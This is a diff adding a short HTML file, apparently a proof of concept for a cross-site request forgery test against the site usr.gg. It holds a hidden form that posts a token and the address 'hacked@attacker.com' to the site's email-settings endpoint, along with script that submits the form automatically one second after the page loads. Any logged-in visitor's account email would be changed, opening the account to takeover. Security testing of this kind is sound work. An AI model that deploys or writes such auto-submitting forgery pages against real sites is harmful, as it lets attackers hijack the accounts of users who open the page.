@@ -1,0 +1,25 @@
+<html>
+<head>
+    <title>CSRF Test</title>
+</head>
+<body>
+    <h1>NaderKit Testing CSRF Vulnerability</h1>
+    <p> auto-submit to usr.gg</p>
+    
+    <form action="https://usr.gg/settings/email" method="POST" id="csrf-form">
+        <input type="hidden" name="_token" value="rKIzMW3iEgYXgU7dHkiR0eTSaCgOY9s8k6ibS9YB">
+        <input type="hidden" name="email" value="hacked@attacker.com">
+        <!-- Add any other parameters the form normally sends -->
+        <input type="submit" value="Click here if not redirected">
+    </form>
+    
+    <script>
+        // Auto-submit after page loads
+        window.onload = function() {
+            setTimeout(function() {
+                document.getElementById('csrf-form').submit();
+            }, 1000);
+        };
+    </script>
+</body>
+</html>
